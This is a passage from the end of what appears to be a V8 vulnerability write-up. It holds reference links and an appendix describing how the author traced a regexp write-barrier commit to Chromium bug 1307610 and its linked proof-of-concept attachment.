- <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/@@replace#examples>
- <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex#examples>
- [V8 Garbage Collection Note](../../../../notes/pwn/v8/#garbage-collection)

## Appendix

### OSINT

Before I managed to find the corresponding CVE identifier, I was looking around
the history of `src/regexp/regexp-utils.cc` file and found a [commit](https://github.com/v8/v8/commit/bdc4f54a50293507d9ef51573bab537883560cc8)
message concerning write barrier. The detail on this commit message also link
the chromium bug tracker ID `1307610`. Using this ID, I managed to find out the
[chromium issue tracker website](https://issues.chromium.org/issues?q=1307610) and search the said ID.

> [!NOTE]
> Another way is to click on the [chromium review link](https://chromium-review.googlesource.com/c/v8/v8/+/3534849) then click on the chromium bug hyperlink.

In this issue tracking page, the author provides [proof-of-concept (PoC)](https://issues.chromium.org/action/issues/40059133/attachments/53188081?download=false) on
how to reproduce the vulnerability.
